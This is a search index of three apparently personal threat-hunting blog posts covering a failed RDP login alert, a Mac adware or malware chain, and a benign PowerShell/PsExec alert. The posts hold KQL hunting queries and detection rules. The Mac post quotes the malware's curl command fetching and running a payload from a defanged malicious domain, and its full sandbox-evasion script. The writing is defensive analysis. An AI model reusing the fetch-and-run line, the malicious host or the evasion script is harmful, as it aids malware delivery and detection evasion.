[ { "title": "Unusual number of failed sign-in attempts", "url": "/posts/Admin_Login_Failure/", "categories": "Hunting, MDE", "tags": "mde, hunting, true positive", "date": "2022-05-21 20:39:00 +0200", "snippet": "Today we investigate some failed loginsThe AlertTodays alert looks simple enough, failed loggins with the user “Administrator”But very quickly we see some not so good indicator, the login connection is from 87.251.67.65, so we will focus on this for now.The IP seems to be hosted in Russia judging by the whois entry.Going a bit more in detail of what this IP is doing with my clients, I ran a small advanced hunting query.let ip = &quot;87.251.67.65&quot;;search in (DeviceNetworkEvents, DeviceFileEvents, DeviceLogonEvents, DeviceEvents, EmailEvents, IdentityLogonEvents, IdentityQueryEvents, IdentityDirectoryEvents, CloudAppEvents, AADSignInEventsBeta, AADSpnSignInEventsBeta)Timestamp between (ago(1d) .. now())and (// Events initiated by this IPLocalIP == ipor FileOriginIP == ipor RequestSourceIP == ipor SenderIPv4 == ipor SenderIPv6 == ipor IPAddress == ip// Events affecting this IPor RemoteIP == ipor DestinationIPAddress == ip)And this returns us some good information, the failed logins are over an RDP connection.Now why would this even be possible?To check a bit closer I shot off another small hunting query.DeviceNetworkEvents| where DeviceId == @&quot;mydevice&quot;| where RemoteIPType == @&quot;Public&quot;| where ActionType == @&quot;InboundConnectionAccepted&quot;| distinct LocalPortThis resulted in a whole plethora of public IPs that are connecting to this device over multiple portsPorts observed: 3389 135 8080 2179 2701 57621 139Flowchart%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD;87.251.67.65 --&amp;gt; 3389;3389 --&amp;gt; mydevice;style mydevice stroke-dasharray: 88.5 44;Verdict Indicator Thoughts Verdict Logins from Public IP Normally a public IP would not be able to just connect to an endpoint +20% Login via RDP Again, why would RDP be available from public? +30% Huge amount of Public Source IPs Looks very much like the client is reachable from public… +50% It seems like the endpoint is reachable from the public internet.This could have happened via UPNP, manual port forwarding, or by assigning a public IP directly to that host.Especially the port 8080 being reachable seems like this might have been a voluntary action by the user.Verdict: True PositiveNext StepsThis endpoint should never be reachable from the public internet, what a mess" }, { "title": "Mac Malware?", "url": "/posts/Mac-Malware/", "categories": "Hunting, MDE", "tags": "mde, hunting, true positive", "date": "2022-05-19 11:39:00 +0200", "snippet": "Today we investigate some strange discovery actions by processes on a macbookThe AlertIn the essence this alert was showing multiple different processes doing very similar actions, for the sake of simplicity we will focus on one.In most cases the process xpcproxy was used to run a sub process which in turn started some bash commands.For this investigation I put xpcproxy out of scope as it did not seem to be part of a malicious execution chain as it is part of the OS (my mac knowledge is basic)This xpcproxy would run an executable for example apadecoded and this in turn would run new processes, for example:/bin/sh /var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/451CEB63-C438-40C3-899F-0BE4F425F074apadecoded itself looks already strange enough and is also found on VT, but what is this “451CEB63-C438-40C3-899F-0BE4F425F074”?here again, for simplicity I focus on one of these odd looking processes, there are a bucket load of them.This executable runs a download via curl of some additional code from external and extracts it to “/private/var/tmp/helpexecd/helpexecd”/usr/bin/curl -s -L -o /var/tmp/helpexecd.tgz hxxp://cdn[.]eniqdix[.]icu/static/s3/exec6625/helpexecd[.]tgztar -xzf /var/tmp/helpexecd.tgz -C /var/tmp/helpexecd/After that the archive helpexecd.tgz is extracted to /var/tmp/helpexecd/ and executed.This new process helpexecd then runs the following command (amongst other things)/bin/sh -c &#39;readonly VM_LIST=&quot;VirtualBox\\|Oracle\\|VMware\\|Parallels\\|qemu&quot;;is_hwmodel_vm(){ ! sysctl -n hw.model|grep &quot;Mac&quot;&amp;gt;/dev/null;};is_ram_vm(){(($(($(sysctl -n hw.memsize)/ 1073741824))&amp;lt;4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo &quot;${ped}&quot;|grep -e &quot;board-id&quot; -e &quot;product-name&quot; -e &quot;model&quot;|grep -qi &quot;${VM_LIST}&quot;||echo &quot;${ped}&quot;|grep &quot;manufacturer&quot;|grep -v &quot;Apple&quot;&amp;gt;/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e &quot;Manufacturer&quot; -e &quot;Vendor Name&quot;|grep -qi &quot;${VM_LIST}&quot;;};is_hw_data_vm(){ system_profiler SPHardwareDataType 2&amp;gt;&amp;amp;1 /dev/null|grep -e &quot;Model Identifier&quot;|grep -qi &quot;${VM_LIST}&quot;;};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&amp;amp;&amp;amp;echo 1||echo 0;};main &quot;${@}&quot;&#39;On closer inspection and a bit of unwrapping, it looks a lot like this helpexecd is trying to figure out if it’s running in a sandbox.It checks for what hardware it’s running on, good indication of sandbox evasion./bin/sh -c &#39;readonly VM_LIST=&quot;VirtualBox\\|Oracle\\|VMware\\|Parallels\\|qemu&quot;;is_hwmodel_vm(){ ! sysctl -n hw.model|grep &quot;Mac&quot;&amp;gt;/dev/null;};is_ram_vm(){ (($(($(sysctl -n hw.memsize)/ 1073741824))&amp;lt;4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo &quot;${ ped}&quot;|grep -e &quot;board-id&quot; -e &quot;product-name&quot; -e &quot;model&quot;|grep -qi &quot;${ VM_LIST}&quot;||echo &quot;${ ped}&quot;|grep &quot;manufacturer&quot;|grep -v &quot;Apple&quot;&amp;gt;/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e &quot;Manufacturer&quot; -e &quot;Vendor Name&quot;|grep -qi &quot;${ VM_LIST}&quot;;};is_hw_data_vm(){ system_profiler SPHardwareDataType 2&amp;gt;&amp;amp;1 /dev/null|grep -e &quot;Model Identifier&quot;|grep -qi &quot;${ VM_LIST}&quot;;};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&amp;amp;&amp;amp;echo 1||echo 0;};main &quot;${ @}&quot;&#39;Flowchart%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD;kernel_task --&amp;gt; launchd;launchd --&amp;gt; xpcproxy;xpcproxy --&amp;gt; |run| apadecoded;apadecoded --&amp;gt; 451CEB63-C438-40C3-899F-0BE4F425F074;apadecoded --&amp;gt; |run| DFBDC5FD-3F69-472A-832B-C8C394560BC4;apadecoded --&amp;gt; AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09;451CEB63-C438-40C3-899F-0BE4F425F074 --&amp;gt; curl;DFBDC5FD-3F69-472A-832B-C8C394560BC4 --&amp;gt; |run| curl;AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09 --&amp;gt; curl;curl --&amp;gt; cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz;cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --&amp;gt; |download| 89.187.162.142;cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --&amp;gt; |download| 89.187.162.134;89.187.162.142 --&amp;gt; |download| /private/var/tmp/helpexecd/helpexecd.tgz;89.187.162.134 --&amp;gt; |download| /private/var/tmp/helpexecd/helpexecd.tgz;/private/var/tmp/helpexecd/helpexecd.tgz --&amp;gt; |extract &amp;amp;&amp;amp; run| helpexecd;helpexecd --&amp;gt; 35.160.226.50;helpexecd --&amp;gt; 34.217.226.241;style apadecoded stroke-dasharray: 88.5 44style helpexecd stroke-dasharray: 88.5 44Hunting deeperWe have so far focused on one process, but here is a list of a lot more of them.All of them do the exact same things, which really makes me think that his could be real malware, how exciting. canonistical noble odontolite intrinsicalness TestDate SysUpdater leam recommitment TestDateDaemon apadecode apadecodedI now turned to Virustotal to see what they have to say about this.Once again with focus on one process apadecodedon VT I get a lot of Adware chatter, which in my opinion of course could be true. But some also classify this as outright malware.It is always difficult to know when to stop an investigation, I would love to analyse this more in a sandbox, but since we usually only have Windows Sandboxes, and I have no patience to build a mac one, let’s stop this here.I think we have enough indicators anywayVerdict Indicator Thoughts Verdict Process starts strangely named Processes Maybe a kind of obfuscation? +20% “Obfuscated” process downloads additional code Very likely bad behaviour +20% Newly downloaded code is checks hardware it is running on (sandbox evasion) Sandbox evasion is often a bad sign +20% Many processes doing exactly the same Once again, this looks like something done to confuse the defender +20% Virustotal results in Adware or Malware Honestly, it could be Adware, but I will treat as Malware +20% Verdict: True PositiveNext StepsReinstall that machine, no patience for cleaning such a mess" }, { "title": "Powershell and PSExec", "url": "/posts/Powershell-PSexec/", "categories": "Hunting, MDE", "tags": "mde, hunting, psexec, false positive", "date": "2022-05-17 21:39:00 +0200", "snippet": "Today we investigate some strange behaviour from a (possibly user) executed Powershell session.The AlertEverything started with an explorer.exe running the following commandline.&quot;cmd.exe&quot; /c echo|set/p=&quot;C:\\Temp\\Tools&quot;|powershell -NoP -W 1 -NonI -NoL &quot;SaPs &#39;cmd&#39; -Args &#39;/c &quot;&quot;&quot;cd /d&#39;,$([char]34+$Input+[char]34),&#39;^&amp;amp;^&amp;amp; start /b cmd.exe&quot;&quot;&quot;&#39; -Verb RunAs&quot;When explorer.exe starts something, this usually means that a user started this with a run command.However, as there are ways to obfuscate this by for example running cmd likethis explorer.exe /root,&quot;C:\\Windows\\System32\\cmd.exe&quot;Let’s first inspect the commandline though, it seems to switch the execution path to C:\\Temp\\Tools and elevate toadministrative rights.I always like to first get a handle on the parameters used to run powershell. Parameter Parameter Full Explanation -NoP -NoProfile Who would do that? Doesn’t really have a negative impact though -W 1 -WindowStyle 1 Strange param because usually one would see “Normal, Minimized, Maximized or Hidden” no numbers -NonI -NonInteractive Makes the session non interactive, which is of course interesting -NoL -NoLogo Removes the Logo of session, no real impact The -W 1 param is definitely fancy for me, usually one would expect -W Hidden, but it seems like itaccomplishes the same job.So far my verdict is, the user executed this process, which makes it more or less legitimate, but the params arestrange, so I cannot say a direct false or true positive right now.Because of this, we need to dig deeper.Hunting deeperIn MDE we can also see the following alerts:But there is exactly no information on why MDE thinks that there is suspicious discovery going on.Because of this I decided to check if there were new processes spawned after the admin cmd.exe via advanced hunting.For this we take the PID and timeframe of execution and of course the device the execution happened on.Example script:let pid = &quot;1234&quot;;let device = &quot;mydevice&quot;;let time_span = datetime(2022-01-01T00:00:00);DeviceProcessEvents| where Timestamp between (time_span .. (time_span + 1d))| where DeviceName contains device| where ProcessId == pid or InitiatingProcessId == pid| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessCommandLine, ProcessId, InitiatingProcessId, InitiatingProcessParentId, ReportId| order by Timestamp ascThis in the end gave me some interesting results.We can see (in green) the parent process cmd.exe spawned two sub processes, once again cmd.exe and oneconhost.exe 0xffffffff -ForceV1 we will get back to conhost.exe laterOf course now I wanted to get an understanding of if this new cmd.exe started something, so I adjusted my hunting queryand tried again with this result:PsExecThe executed PsExec commands:PsExec.exe \\\\mydevice -accepteula -nobanner -s cmd /c powershell.exe -noninteractive -command &quot;&amp;amp;{Get-MPComputerStatus | Select-Object -Property AntispywareEnabled, AntivirusEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled}&quot;PsExec.exe \\\\mydevice -accepteula -nobanner -s cmd /c powershell.exe -noninteractive -command &quot;&amp;amp;{Get-MPComputerStatus | Select-Object -Property AMServiceEnabled, AntispywareEnabled, AntispywareSignatureLastUpdated, AntivirusEnabled, AntivirusSignatureLastUpdated, BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, NISSignatureLastUpdated, OnAccessProtectionEnabled, RealTimeProtectionEnabled, TamperProtectionSource}&quot;Now we are getting somewhere, PSExec was executed, why this was not mentioned in the alert is beyond me. Goes to showthat you should not just blindly trust MDE to do its job.But it definitely explains the “suspicious discovery” which MDE was talking about.Reading the commands used is quite easy, someone is trying to get information about the security status of this device.Let’s be honest, if an attacker already is admin, there is no need to use noisy tools like PsExec which every EDR onearth notices.So far the flow of process looks a bit like this:%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD; ex[explorer.exeRunning in user context]; cmd1[cmd.exeRunning in user context]; ps1[powershell.exeRunning in user context]; cmd2[cmd.exeRunning in admin context]; conhost[conhost.exe]; cmd3[cmd.exeRunning in admin context]; PSExec[PSExec.exe]; PSExec2[PSExec.exe]; ex --&amp;gt; cmd1; cmd1 --&amp;gt; ps1; ps1 --&amp;gt; cmd2; cmd2 --&amp;gt; cmd3; cmd2 --&amp;gt; conhost; cmd3 --&amp;gt; PSExec; cmd3 --&amp;gt; PSExec2;conhost.exeAnd what about conhost.exe 0xffffffff -ForceV1?I did a bit of research about it and came to no intelligent conclusion whatsoever.Hausec has a good writeup on cobalt strike which hassimilar behaviour. I had a closer look into this and came across a post instrontic about thistopic which brought me tothisSigma rule.I took the Sigma rule and converted it to KQL with uncoder:DeviceProcessEvents| where ( (ProcessCommandLine contains @&quot;\\cmd.exe /C whoami&quot; and InitiatingProcessFolderPath startswith @&quot;C:\\Temp&quot;) or ( ProcessCommandLine contains &quot;conhost.exe 0xffffffff -ForceV1&quot; and ( InitiatingProcessCommandLine contains &quot;/C whoami&quot; or InitiatingProcessCommandLine contains &quot;cmd.exe /C echo&quot; or InitiatingProcessCommandLine contains @&quot; &amp;gt; \\\\\\\\.\\\\pipe&quot; ) ) or ( ( ProcessCommandLine contains &quot;cmd.exe /c echo&quot; or ProcessCommandLine contains @&quot;&amp;gt; \\\\\\\\.\\\\pipe&quot; or ProcessCommandLine contains @&quot;\\whoami.exe&quot; ) and InitiatingProcessFolderPath endswith @&quot;\\dllhost.exe&quot; ) or ( FolderPath endswith @&quot;\\cmd.exe&quot; and InitiatingProcessFolderPath endswith @&quot;\\runonce.exe&quot; and InitiatingProcessCommandLine endswith @&quot;\\runonce.exe&quot; ) )| distinct DeviceName, ProcessCommandLine,InitiatingProcessCommandLine,FolderPath,InitiatingProcessFolderPathRunning this against our environment, focused on our specific device, I was unable to find any traces, which makes memore or less certain that this has nothing to do with cobalt strike in our case.Privilege EscalationNow knowing the full path of what happened, I had another look into the “privilege escalation” aspect.The logged-in user went from user to administrator, however as far as I was able to check via UAC, so all is in order.This and the understanding of what was happening, made me feel certain enough of what happened, which enables me to getin touch with the user.The user was able to confirm that they are debugging some issues with the installed endpoint protection which fittedinto my view of the matter.Verdict Indicator Thoughts Verdict CMD started by User Either compromise of host, or legitimate action by user -10% Powershell started with odd parameters The parameters looks pretty malicious / suspicious +90% Elevation of Privileges via UAC This is very normal behaviour and would indicate that someone has access to both user and admin passwords, unlikely -10% Running of PsExec PsExec is often used for malicious behaviour, but in this case local execution as admin makes no actual sense -10% Explanation by user The Explanation of the user made sense and fit into my perspective of how the alert played out -100% Verdict: False PositiveNext StepsGet better processes, it’s no good to use PSExec on a business device in my opinion" } ]
